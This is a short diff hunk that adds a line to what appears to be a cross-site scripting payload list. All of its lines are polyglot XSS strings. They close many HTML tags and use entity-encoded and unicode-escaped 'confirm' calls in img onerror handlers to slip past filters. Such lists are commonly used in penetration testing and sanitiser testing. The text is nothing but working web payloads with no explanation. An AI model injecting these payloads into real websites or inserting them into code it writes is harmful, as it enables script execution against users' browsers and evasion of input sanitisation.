@@ -145,3 +145,4 @@ javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"`/+/on
 '"<!-->)</Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript><Img Src=OnXSS OnError=(confirm)(1)>
 '"<!-->)</Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript><Img Src=OnXSS OnError=&#x63;onfir\u006d`1`>
 '"<!-->)</Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript><IMG SrC=x OnError=&#99;&#x6f;&#x00006e;\u0066irm(1)>
+<h1>XSS</h1><IMG SrC=x OnError=&#99;&#x6f;&#x00006e;\u0066irm(1)></h1>
